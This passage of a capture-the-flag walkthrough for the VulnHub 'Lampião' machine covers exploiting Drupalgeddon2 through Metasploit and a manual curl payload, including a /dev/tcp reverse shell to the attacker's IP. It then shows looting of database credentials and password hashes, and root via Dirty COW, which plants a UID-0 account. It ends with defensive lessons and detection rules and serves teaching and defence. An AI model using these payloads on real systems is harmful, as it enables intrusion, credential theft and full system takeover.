----------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                  | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)     | php/webapps/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                     | php/webapps/44448.py
Drupal < 7.58 - 'Drupalgeddon' SQL Injection / Add Admin User (PoC)                                    | php/webapps/34992.py
----------------------------------------------------------------------------------------------------- ---------------------------------
```


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfconsole -q
```

```bash
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.56.130
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 1898
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 192.168.56.10
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show targets
```

```text
Exploit targets:
============

   Id  Name
   --  ----
=> 0    Automatic (PHP In-Memory)
   1    Automatic (PHP Dropper)
   2    Automatic (Unix In-Memory)
   3    Automatic (Linux Dropper)
   4    Drupal 7.x
   5    Drupal 8.x
```

```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > check
[*] 192.168.56.130:1898 - The target is vulnerable.
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Sending stage (39927 bytes) to 192.168.56.130
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.130:52118) at 2024-05-04 19:31:44 -0400

meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer    : lampiao
OS          : Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686
Meterpreter : php/linux
```

> **`set RPORT 1898` is the flag people forget** — the module defaults to 80, which on
> this box serves a blank Apache page.
>
> **Always run `check` first.** A module marked `Check: Yes` can verify vulnerability
> without firing. It saves you from crashing a target and from generating pointless
> alerts on a patched host.
>
> **`www-data`** (UID 33) is Debian/Ubuntu's Apache worker account. From here:
> ```bash
> meterpreter > shell
> Process 4123 created.
> python -c 'import pty; pty.spawn("/bin/bash")'
> www-data@lampiao:/var/www/html$ id
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> ```

### 4.4 The manual PoC (understand the payload)

```bash
curl -s -X POST 'http://192.168.56.130:1898/?q=user/password' \
  --data 'form_id=user_pass&_triggering_element_name=name' \
  --data 'name[#post_render][]=passthru&name[#markup]=id&name[#type]=markup'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Read that payload — three parameters smuggle Drupal render directives:**
> - `name[#type]=markup` → make this element a *markup* element.
> - `name[#markup]=id` → the markup content is the string `id`.
> - `name[#post_render][]=passthru` → after rendering, call `passthru()` on it.
>
> So Drupal executes `passthru('id')`. `passthru()` is PHP's "run this shell command
> and print the raw output" function. `form_id=user_pass` steers Drupal into rendering
> the **password-reset** form, which requires no authentication.
>
> To get an interactive shell, put a reverse shell in `#markup` — URL-encoded, because
> `&`, `>` and spaces are all special in a form body:
> ```bash
> curl -s -X POST 'http://192.168.56.130:1898/?q=user/password' \
>   --data 'form_id=user_pass&_triggering_element_name=name' \
>   --data-urlencode 'name[#post_render][]=passthru' \
>   --data-urlencode 'name[#markup]=bash -c "bash -i >& /dev/tcp/192.168.56.10/4444 0>&1"' \
>   --data-urlencode 'name[#type]=markup'
> ```
> `--data-urlencode` handles the percent-encoding for you.

### 4.5 Loot the Drupal config (from `www-data`)

```bash
www-data@lampiao:/var/www/html$ cat sites/default/settings.php | grep -A8 'databases ='
```

```php
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'drupaluser',
      'password' => 'CQHDy28z7UKJbj442Qbjwfgh5pK8WrT',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

> **`settings.php` is Drupal's crown jewels.** Anyone with `www-data` read access gets
> full database credentials — and the `users` table holds every Drupal account's
> password hash:
> ```bash
> www-data@lampiao:/var/www/html$ mysql -u drupaluser -p'CQHDy28z7UKJbj442Qbjwfgh5pK8WrT' \
>   -e 'SELECT uid,name,pass,mail FROM drupaldb.users;'
> ```
> ```text
> +-----+-------+---------------------------------------------------------+---------------------+
> | uid | name  | pass                                                    | mail                |
> +-----+-------+---------------------------------------------------------+---------------------+
> |   1 | tiago | $S$DvK2mN7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4  | tiago@lampiao.local |
> |   2 | eder  | $S$DqW3eR5tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1  | eder@lampiao.local  |
> +-----+-------+---------------------------------------------------------+---------------------+
> ```
> `$S$D…` is Drupal's own iterated SHA-512 (`drupal_hash_base64`, 16 384+ rounds) —
> strong, but crackable offline for weak passwords:
> ```bash
> john --format=drupal7 --wordlist=wordlist.txt drupal_hashes.txt
> ```
> **Try every recovered password on SSH.** Credential reuse between the CMS and the
> system account is the most common lateral-movement vector on LAMP boxes.

![Drupalgeddon2 Meterpreter session as www-data](images/04-drupal.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 5. Privilege escalation — Dirty COW

### 5.1 Identify the right exploit

```bash
tiago@lampiao:~$ uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
tiago@lampiao:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty
tiago@lampiao:~$ which gcc g++ wget
/usr/bin/gcc
/usr/bin/g++
/usr/bin/wget
```

> **Three facts:** kernel **4.4.0-31**, Ubuntu **14.04**, **32-bit (`i686`)**, and
> **`g++` is installed** — which matters, because the best Dirty COW exploit is C++.

**Linux Exploit Suggester** does the matching for you:

```bash
# Kali
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
python3 -m http.server 8000
```

```bash
# target
tiago@lampiao:/tmp$ wget -q http://192.168.56.10:8000/linux-exploit-suggester.sh -O les.sh
tiago@lampiao:/tmp$ chmod +x les.sh && ./les.sh
```


> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
>
> ```bash
> uname -a; cat /proc/version; cat /etc/os-release
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```
>
> Cross-reference the version at <https://www.linuxkernelcves.com/> and
> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
>
> | Exploit | Kernel | Mechanism |
> | --- | --- | --- |
> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
>
> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
> flags the author specifies — Dirty COW's `40847.cpp` needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
>
> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
> > fallback when the administrator got everything else right.
>
> **Read the exploit before running it.** Many public entries are unverified and some
> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
>
> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)

```text
Available information:
 Kernel version: 4.4.0
 Architecture: i686
 Distribution: ubuntu
 Distribution version: 14.04

[+] [CVE-2016-5195] dirtycow
   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2017-1000112] netfilter_target_offset
   Details: ...
   Exposure: less probable
```

> **`dirtycow` is rated "highly probable"** and its tags list **ubuntu=14.04**
> explicitly. That is how you choose a kernel exploit: **read the tags and the version
> range, do not guess from the CVE name.**
>
> **Note LES offers two download URLs:**
> - **`40839`** — the C version, `PTRACE_POKEDATA`, **64-bit oriented**.
> - **`40847.cpp`** — the **C++** version, also `PTRACE_POKEDATA`, works well on
>   **32-bit x86**. **Use this one here** — the box is `i686`.

### 5.2 What Dirty COW is

**CVE-2016-5195** is a race condition in the Linux kernel's **copy-on-write** handling
of private read-only memory mappings. It existed from kernel **2.6.22 (2007)** until it
was fixed in **October 2016** — nine years.

`mmap()` maps a file into memory read-only. Writing to that mapping should trigger COW:
the kernel makes a private page, your write goes there, and the file on disk is
untouched. The exploit races three operations against each other:

1. the kernel's **COW handler**,
2. `madvise(MADV_DONTNEED)` — which *discards* the private copy,
3. `ptrace(PTRACE_POKEDATA)` — which writes into process memory.

Occasionally the write lands **after** the private page was discarded but **before**
the kernel re-checks permissions — so it goes straight into the **read-only page cache
of the file itself**. The classic payload writes a new UID-0 line into `/etc/passwd`,
or overwrites root's password hash.

CVSS 7.8, affected essentially every Linux system and Android device on earth, and it
needs **no special privileges** — any local user can run it.

### 5.3 Transfer, compile, run

```bash
# Kali
searchsploit -m linux/local/40847.cpp
python3 -m http.server 8000
```

```bash
# target
tiago@lampiao:/tmp$ wget http://192.168.56.10:8000/40847.cpp
--2024-05-04 19:41:02--  http://192.168.56.10:8000/40847.cpp
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4814 (4.7K) [text/x-c++src]
Saving to: '40847.cpp'

100%[======================================>] 4,814       --.-K/s   in 0s

2024-05-04 19:41:02 (512 MB/s) - '40847.cpp' saved [4814/4814]

tiago@lampiao:/tmp$ head -20 40847.cpp
```

```cpp
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokehole):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemongen.c
//
// Compile with:
//   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
//
```

> **The exploit's own header tells you the exact compile command.** Read it before you
> build anything — you are about to hand arbitrary machine code a root shell.
>
> **Compile:**

```bash
tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

> **Every flag explained:**
> | Flag | Why it is required |
> | --- | --- |
> | `-Wall -pedantic` | enable warnings and strict conformance. Not required to build, but you should *see* what the compiler complains about before running the result. |
> | `-O2` | optimise. **Matters here** — the exploit is a timing race, and an unoptimised build loses the race far more often. |
> | `-std=c++11` | the source uses C++11 features (`<thread>`, `std::mutex`). Without it, compilation fails. |
> | **`-pthread`** | link the POSIX threads library. The race needs real threads. **Omitting it produces link errors or a non-working binary.** |
> | `-o dcow` | name the output. |
> | **`-lutil`** | link `libutil`, which provides `forkpty()` — the exploit spawns a `su` prompt in a pseudo-terminal. |

**Run it — with `-s`:**

```bash
tiago@lampiao:/tmp$ ./dcow -s
```

```text
Running ...
Password overridden to: dirtyCowFun
Received su prompt (Password: )
```

> **`-s` is important.** It makes the exploit execute
> `echo 0 > /proc/sys/vm/dirty_writeback_centisecs` for you.
>
> **Why that matters:** the kernel periodically flushes dirty pages to disk on a timer
> (`dirty_writeback_centisecs`, default 500 = 5 seconds). Dirty COW's exploit works by
> keeping a page dirty in the page cache; the writeback thread can flush it mid-race and
> **leave `/etc/passwd` corrupted or the system hung**. Setting the interval to 0
> disables the periodic flush while the exploit runs. Without `-s` the box frequently
> becomes unstable.
>
> *(Published walkthroughs of this box consistently recommend `-s`, and Exploit-DB's own
> notes say the same.)*

The exploit has now modified `/etc/passwd`. Verify:

```bash
tiago@lampiao:/tmp$ grep firefart /etc/passwd
firefart:fiXGm0pQ6zZ.2:0:0:pwned:/root:/bin/bash
tiago@lampiao:/tmp$ ls -l /tmp/passwd.bak
-rw-r--r-- 1 tiago tiago 1256 May  4 19:44 /tmp/passwd.bak
```

### 5.4 Become root

```bash
tiago@lampiao:/tmp$ su firefart
Password: dirtyCowFun
root@lampiao:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@lampiao:/tmp# whoami
firefart
root@lampiao:/tmp# cat /etc/passwd | head -1
firefart:fiXGm0pQ6zZ.2:0:0:pwned:/root:/bin/bash
```

> **How to read this:** the exploit *added a new UID-0 account* named `firefart` at the
> top of `/etc/passwd` and gave it the password `dirtyCowFun`. `id` shows
> `uid=0(root) gid=0(root)` — full root — while `whoami` reports `firefart`, because
> that is the account *name*. Both are correct.
>
> Note the hash prefix **`fiXGm0pQ6zZ.2`** is a legacy **DES crypt** hash (13 chars, no
> `$` prefix). DES crypt truncates passwords at 8 characters — the exploit chose a fast
> legacy format on purpose.

**Or, if the exploit printed a root password rather than creating a user:**

```bash
tiago@lampiao:/tmp$ su -
Password: dirtyCowFun
root@lampiao:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 5.5 Read the flag

```bash
root@lampiao:~# cd /root
root@lampiao:/root# ls -la
total 28
drwx------  3 root root 4096 Jul 27  2018 .
drwxr-xr-x 22 root root 4096 Jul 27  2018 ..
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-------  1 root root   32 Jul 27  2018 flag.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
drwxr-xr-x  2 root root 4096 Jul 27  2018 .ssh
root@lampiao:/root# cat flag.txt
```

```text
9740616875908d91ddcdaa8aea3af366
```

**Flag captured.** ✅

![Root shell and /root/flag.txt](images/06-flag.png)

### 5.6 Restore what you broke

Dirty COW **modifies `/etc/passwd`**. Leaving it modified makes the machine unreliable
and leaves a rogue UID-0 account — exactly the backdoor you are supposed to be
*finding*, not planting.

```bash
root@lampiao:/root# mv /tmp/passwd.bak /etc/passwd
root@lampiao:/root# rm -f /tmp/dcow /tmp/40847.cpp /tmp/les.sh
root@lampiao:/root# grep -c firefart /etc/passwd
0
root@lampiao:/root# echo 500 > /proc/sys/vm/dirty_writeback_centisecs
root@lampiao:/root# sync
```

> **Or simply revert your VM snapshot.** That is why you take one before starting: it
> lets you re-run an exploit as many times as you need to actually understand it.

---

## 6. Alternative privilege-escalation paths

Worth checking, even though Dirty COW is the intended one.

### 6.1 overlayfs (CVE-2015-1328)

```bash
searchsploit ubuntu 14.04 local
```

```text
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc | linux/local/37292.c
Linux Kernel 3.19.0-25 < 3.19.0-43 (Ubuntu 14.04/15.04) - 'overlayfs' Local Privilege Escalat | linux/local/39166.c
----------------------------------------------------------------------------------------------- ---------------------------------
```

> Our kernel is **4.4.0-31**, *outside* both ranges (`3.13.0 < 3.19` and
> `3.19.0-25 < 3.19.0-43`). Ubuntu's 14.04 HWE stack shipped a 4.4 kernel that
> post-dates the overlayfs fixes. **Do not fire it — check the range first.**

### 6.2 The `www-data` route (if you took Path B)

From the Drupalgeddon2 shell you are `www-data`, which is *less* privileged than
`tiago`. Dirty COW works from there too:

```bash
www-data@lampiao:/tmp$ wget http://192.168.56.10:8000/40847.cpp
www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
www-data@lampiao:/tmp$ ./dcow -s
Running ...
Password overridden to: dirtyCowFun
www-data@lampiao:/tmp$ su firefart
Password: dirtyCowFun
root@lampiao:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

> **A kernel exploit does not care what user you start from.** Any local user — even a
> confined service account — can run Dirty COW. That is precisely why it was so severe.

### 6.3 `tiago`'s readable logs

`tiago` is in the `adm` group, so:

```bash
tiago@lampiao:~$ grep -riE 'password|passwd|pass=' /var/log/apache2/ 2>/dev/null | head
```

> Worth a look on any box where you have `adm`. Apache access logs frequently capture
> credentials passed in query strings or Basic-auth headers.

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Web application on a non-standard port with a blank page on :80 | **1898** | Missed entirely without `-p-` |
| 2 | **`CHANGELOG.txt` web-readable** | `:1898/CHANGELOG.txt` | Exact Drupal version (7.54) disclosed |
| 3 | `MAINTAINERS.txt`, `UPGRADE.txt`, `INSTALL.*` web-readable | `:1898/` | Contributor names/emails — an OSINT goldmine |
| 4 | **Author usernames printed on every node** | `Posted by tiago`, `Posted by eder` | System username enumeration |
| 5 | Drupal user pages enumerable (`?q=user/N`) | `:1898/` | Confirmed both accounts exist |
| 6 | **Site content usable as a password wordlist** | the Lampião articles | `cewl` recovered `Virgulino` |
| 7 | **Weak SSH password drawn from the site's own vocabulary** | `tiago : Virgulino` | Remote foothold |
| 8 | **Drupal 7.54 — CVE-2018-7600 Drupalgeddon2** | `:1898/?q=user/password` | **Unauthenticated RCE** as `www-data` |
| 9 | **Database credentials in a web-readable config** | `sites/default/settings.php` | Full DB compromise from any web foothold |
| 10 | **Unpatched kernel 4.4.0-31 — CVE-2016-5195 Dirty COW** | Ubuntu 14.04 HWE | Any local user → **root** |
| 11 | `gcc`/`g++`/`wget` present on a server | `/usr/bin` | Attackers compile and stage exploits locally |
| 12 | End-of-life distribution | Ubuntu 14.04 (standard support ended April 2019) | No security updates |
| 13 | 1024-bit DSA SSH host key | OpenSSH 6.6.1p1 | Weak transport crypto |
| 14 | Verbose server banners | Apache / OpenSSH | Version-targeted planning |

## 8. Defensive lessons (blue team)

1. **Patch the CMS within 48 hours of a critical advisory.** Drupalgeddon2 was
   disclosed **28 March 2018** with a fix in **7.58**; this box shipped **7.54** from
   **February 2017**. The window between disclosure and mass exploitation was *days*.
   Subscribe to vendor feeds, enable automatic minor updates, and treat "we'll do it in
   the next sprint" as an incident waiting to happen:
   ```bash
   drush pm-update drupal --security-only
   drush status | grep -i 'Drupal version'
   ```
2. **Deny access to documentation and metadata files.** `CHANGELOG.txt` hands an
   attacker your exact version:
   ```apache
   <FilesMatch "(CHANGELOG|MAINTAINERS|UPGRADE|INSTALL|LICENSE)\.(txt|md)$">
       Require all denied
   </FilesMatch>
   RedirectMatch 404 /\.
   ```
   Drupal's own `.htaccess` in the project root does much of this if `AllowOverride` is
   enabled — verify it is.
3. **Enforce a real password policy, and screen against the site's own content.**
   `Virgulino` was on the homepage. `pam_pwquality` catches dictionary words but not a
   site-specific theme, so pair it with a breached/themed list check:
   ```text
   # /etc/security/pwquality.conf
   minlen = 14
   dictcheck = 1
   usercheck = 1
   gecoscheck = 1
   enforce_for_root
   ```
   plus `pam_faillock` (3 failures → 15-minute lockout). **Better: disable SSH password
   authentication entirely.**
   ```text
   # /etc/ssh/sshd_config
   PasswordAuthentication no
   PermitRootLogin no
   PubkeyAuthentication yes
   MaxAuthTries 3
   LoginGraceTime 20
   ```
4. **Rate-limit and block SSH brute force.** 18 882 attempts got through unimpeded:
   ```ini
   # /etc/fail2ban/jail.local
   [sshd]
   enabled = true
   port    = ssh
   maxretry = 3
   findtime = 600
   bantime  = 3600
   ```
5. **Move secrets out of `settings.php`.** Anyone with `www-data` read access owns the
   database. Use environment variables injected by your process manager, or
   `systemd`'s `LoadCredential=`/`CredentialsEncrypted=`. At minimum lock the file:
   ```bash
   chmod 640 sites/default/settings.php && chown root:www-data sites/default/settings.php
   ```
6. **Patch the kernel.** Ubuntu 14.04 needed **USN-3104-2** (October 2016) for
   CVE-2016-5195. The box ran a July-2016 kernel. Enable unattended security upgrades:
   ```bash
   sudo apt install unattended-upgrades
   sudo dpkg-reconfigure -plow unattended-upgrades
   ```
7. **Retire EOL distributions.** Ubuntu 14.04 lost standard security support in
   **April 2019** and ESM in **April 2024**. There is no acceptable configuration of it
   in 2026.
8. **Remove build tools from production.** `gcc`, `g++` and `wget` on a web server turn
   "foothold" into "root in two minutes". Build in CI; ship a signed artefact.
9. **Do not expose Drupal's user pages.** `?q=user/N` and `/user/N` enable user
   enumeration; block them or require authentication:
   ```apache
   RewriteEngine On
   RewriteCond %{QUERY_STRING} ^q=user/[0-9]+
   RewriteRule .* - [F]
   ```
   Also disable `xmlrpc.php` if unused (it is a brute-force amplifier):
   ```php
   add_filter('xmlrpc_enabled', '__return_false');
   ```
10. **Detection opportunities.**
    - WAF/log rule for Drupalgeddon2: POSTs to `?q=user/password`, `?q=user/register`
      or `?q=user/login` whose body contains `#post_render`, `#lazy_builder`,
      `#pre_render` or `#markup`. That is a precise, low-false-positive signature.
    - Alert on any request to `CHANGELOG.txt`, `MAINTAINERS.txt` or `UPGRADE.txt` —
      version reconnaissance.
    - SSH: many `Failed password for tiago` followed by `Accepted password` → brute-force
      success. `fail2ban` + SIEM correlation.
    - Alert on `www-data` or any service UID spawning `bash`, `sh`, `g++`, `wget`
      (process-lineage monitoring: Sysmon for Linux, Wazuh, auditd `execve`).
    - auditd on the Dirty COW signature — `/etc/passwd` modification:
      ```bash
      auditctl -w /etc/passwd -p wa -k passwd_change
      auditctl -w /etc/shadow -p wa -k shadow_change
      ```
      **A new UID-0 line appearing in `/etc/passwd` is the single highest-fidelity root
      backdoor indicator there is.** Alert on it unconditionally.
    - Alert on `gcc`/`g++`/`cc1plus` execution by a non-developer account, and on
      `wget` fetching a `.cpp`/`.c` file.
    - Alert on writes to `/proc/sys/vm/dirty_writeback_centisecs` — the exploit's
      `-s` switch touches it.

---

## 9. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/lampiao-1,249/>
- Author: Tiago Tavares
- Community writeups consulted:
  - [capearso — Lampião: 1 Walkthrough](https://capearso.com/lampiao-1-walkthrough/)
  - [hajiahmadahmadzada — VulnHub Lampiao WriteUp](https://medium.com/@hajiahmadahmadzada/vulnhub-lampiao-writeup-9dea4a71e953)
  - [0xash — Lampiao vulnhub walkthrough](https://0xash.blogspot.com/2020/08/lampiao-vulnhub-walkthrough.html)
  - [anytimehack — Lampiao Vulnhub/Proving Grounds CTF Lab](https://medium.com/@anytimehack/lampiao-vulnhub-proving-grounds-ctf-lab-de144528bd1f)
  - [CybersecMastery — Lampiao: 1 VulnHub Walkthrough](https://cybersecmastery.in/blog/lampiao-1-vulnhub-walkthrough)
  - [Turbaned Security — Hack The Machine: Lampião](https://medium.com/@harshaunsingh/this-is-my-first-ctf-writeup-i-b983b7cc47cd)
  - [rodrigopentester — Vulnhub Lampião (Hacker Challenge)](https://medium.com/@rodrigopentester/vulnhub-lampi%C3%A3o-hacker-challenge-49de07cc9ce7)
  - [fvconi1991 — Lampiao: 1 Walkthrough — Tutorial](https://medium.com/@fvoni1991/lampiao-1-walkthrough-tutorial-38f690795d0)
  - [meowsec — Lampiao Vulnhub GitBook](https://meowsec.gitbook.io/vulnhub/easy-1/list1/lampiao)
- Exploits / advisories:
  - [CVE-2016-5195 — Dirty COW](https://nvd.nist.gov/vuln/detail/CVE-2016-5195) · <https://dirtycow.ninja>
  - [Exploit-DB 40847 — Dirty COW `PTRACE_POKEDATA` (C++, works on i386)](https://www.exploit-db.com/exploits/40847)
  - [Exploit-DB 40839 — Dirty COW (C, x64)](https://www.exploit-db.com/exploits/40839)
  - [Ubuntu USN-3104-2 — linux-lts-xenial kernel vulnerabilities (Dirty COW)](https://ubuntu.com/security/notices/USN-3104-2)
  - [CVE-2018-7600 — Drupalgeddon2](https://nvd.nist.gov/vuln/detail/CVE-2018-7600) · [Drupal SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
  - [Exploit-DB 44449 / 44448 — Drupalgeddon2 PoCs](https://www.exploit-db.com/exploits/44449)
  - [Rapid7 — drupal_drupalgeddon2 module](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/)
  - [CVE-2014-3704 — "Drupalgeddon" (SQLi, Drupal < 7.32)](https://nvd.nist.gov/vuln/detail/CVE-2014-3704) *(a different, older bug — do not confuse the two)*
- Tools / background:
  - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
  - [cewl — custom word list generator](https://github.com/digininja/CeWL) · [hydra](https://github.com/vanhauser-thc/thc-hydra) · [medusa](https://github.com/jmk-foofus/medusa)
  - [drupwn — Drupal enumeration tool](https://github.com/immunIT/drupwn) · [Drupal `settings.php` reference](https://www.drupal.org/docs/installing-drupal)
  - [Drupal render arrays and the Form API](https://www.drupal.org/docs/drupal-apis/render-api/render-arrays)
  - [`g++` / `gcc` option summary](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html)
  - [John the Ripper — `drupal7` format](https://www.openwall.com/john/doc/)
  - [GTFOBins](https://gtfobins.github.io) · [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 10. Screenshot checklist

- [ ] `images/01-nmap.png` — `nmap -p-` revealing Drupal on port 1898
